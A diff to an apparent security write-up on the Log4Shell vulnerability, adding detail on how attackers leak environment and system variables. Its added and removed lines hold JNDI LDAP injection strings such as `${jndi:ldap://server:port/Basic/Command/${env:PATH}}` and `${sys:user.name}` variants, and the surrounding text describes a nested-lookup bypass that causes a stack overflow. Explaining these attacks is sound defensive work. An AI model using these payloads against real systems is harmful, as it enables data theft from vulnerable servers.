@@ -86,8 +86,8 @@ For example, attackers can send an entry `{$event:Message}` that will become a l
  
 However, this check may be easily be circumvented by sending `${whetever:${event:Message}`. In this case, the check will not detect an infinite loop, and we get a stack overflow exception. In our particular test application this exception has been properly handled, however, it might no be so in other applications.
 
-Attackers can also access sensitive data using other plugins such as `${env (see EnvironmentLookup)`. For example, passing the following variables allows the attacker to see the contents of the PATH environment variable on the machine that runs a vulnerable application:
-`${jndi:ldap://server:port/Basic/Command/${env:PATH}}`
+Attackers can also access sensitive data using other plugins such as `${env` (see [EnvironmentLookup](https://logging.apache.org/log4j/2.x/manual/lookups.html#EnvironmentLookup)). For example, passing the following variables allows the attacker to see the contents of the PATH environment variable on the machine that runs a vulnerable application:
+`${jndi:ldap://server:port/Basic/Command/${env:PATH}}`. Similarly to that, [system variables](https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html) such as OS type and version, username and sensitive paths can be leaked by injecting `${jndi:ldap://server:port/Basic/Command/${sys:user.name}}`, `${jndi:ldap://server:port/Basic/Command/${sys:os.version}}` and similar commands.
  
 An example of the `${env` variable usage in the wild was provided by [Sean Gallagher of Sophos](https://news.sophos.com/en-us/2021/12/12/log4shell-hell-anatomy-of-an-exploit-outbreak/).
 
